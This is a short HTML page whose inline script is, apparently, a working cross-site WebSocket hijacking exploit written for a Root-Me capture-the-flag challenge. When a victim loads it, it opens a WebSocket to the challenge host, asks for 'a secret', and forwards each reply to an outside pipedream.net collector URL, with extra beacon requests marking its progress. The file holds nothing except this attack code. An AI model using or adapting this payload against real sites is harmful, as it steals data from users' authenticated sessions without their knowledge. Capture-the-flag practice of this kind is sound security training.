<!DOCTYPE html>
<html>
  <body>
    <script>
      fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/start');
      const ws = new WebSocket('ws://ctf20.root-me.org/ws');

      ws.addEventListener('open', () => {
        fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/ws-opened');
        ws.send("Tell me a secret");
      });

      ws.addEventListener('message', (event) => {
        fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data));
      });
      fetch('https://eo1gpdjxqwwogrz.m.pipedream.net/end');
    </script>
  </body>
</html>
